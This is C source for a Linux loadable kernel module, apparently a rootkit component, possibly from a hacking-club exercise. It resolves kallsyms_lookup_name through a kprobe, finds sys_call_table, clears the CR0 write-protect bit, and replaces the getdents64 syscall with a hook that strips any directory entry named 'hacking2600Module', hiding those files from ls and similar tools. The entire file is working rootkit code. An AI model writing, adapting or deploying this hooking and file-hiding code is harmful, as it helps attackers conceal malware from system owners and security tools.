#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>
#include <linux/dirent.h>  // For struct linux_dirent64

MODULE_LICENSE("GPL");

// Pointer type for kallsyms_lookup_name
typedef void *(*kallsyms_lookup_name_t)(const char *);

// Function pointer type of syscalls
typedef int (*sysfun_t)(struct pt_regs *);

static kallsyms_lookup_name_t lookup_name = NULL;
static sysfun_t original_getdents64 = NULL;

void cr0_write(unsigned long val)
{
    asm volatile("mov %0,%%cr0"
    : "+r"(val)
    :
    : "memory");
}

// Hooked getdents64 syscall
asmlinkage int new_getdents64(struct pt_regs *regs)
{
    unsigned int fd = (unsigned int) regs->di;
    struct linux_dirent64 *dirp = (struct linux_dirent64 *) regs->si;
    unsigned int count = (unsigned int) regs->dx;

    int nread, bpos;
    struct linux_dirent64 *d;

    nread = original_getdents64(regs);
    if (nread <= 0)
        return nread;

    // Hide everything that have "hacking2600module" in their name
    // ex: ls command
    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent64 *) ((char *) dirp + bpos);
        if (strstr(d->d_name, "hacking2600Module") != NULL) {
            int reclen = d->d_reclen;
            char *next_rec = (char *) d + reclen;
            int len = nread - bpos - reclen;

            memmove(d, next_rec, len);
            nread -= reclen;
            continue;
        }
        bpos += d->d_reclen;
    }

    return nread;
}

// Handling memory protection
static inline unsigned long unprotect_memory(void)
{
    unsigned long cr0;
    unsigned long newcr0;
    cr0 = native_read_cr0(); // in special_insns.h
    newcr0 = cr0 & ~(X86_CR0_WP); // in processor-flags.h
    cr0_write(newcr0);
    return cr0;
}

static inline void protect_memory(unsigned long original_cr0)
{
    native_write_cr0(original_cr0);
}

static int __init hidefile_init(void)
{
    // kprobe kallsyms_lookup_name function
    uint64_t *syscall_table = NULL;
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    register_kprobe(&kp);
    lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    if (!lookup_name) {
        pr_err("[-] Failed to get kallsyms_lookup_name address.\n");
        return -1;
    }

    // get syscall_table address from kallsyms_lookup_name function
    syscall_table = (uint64_t *) lookup_name("sys_call_table");
    if (!syscall_table) {
        pr_err("[-] Failed to get sys_call_table address.\n");
        return -1;
    }

    // saved old syscalls
    original_getdents64 = (sysfun_t) syscall_table[__NR_getdents64];

    // setup new syscalls
    // disable writing memory protection temporarily 
    unsigned long original_cr0 = unprotect_memory();
    syscall_table[__NR_getdents64] = (uint64_t) new_getdents64;
    protect_memory(original_cr0);

    return 0;
}

static void __exit hidefile_exit(void)
{
    // reset old syscalls
    uint64_t *syscall_table = (uint64_t *) lookup_name("sys_call_table");

    if (syscall_table && original_getdents64) {
        unsigned long original_cr0 = unprotect_memory();
        syscall_table[__NR_getdents64] = (uint64_t) original_getdents64;
        protect_memory(original_cr0);
    }
}

module_init(hidefile_init);
module_exit(hidefile_exit);
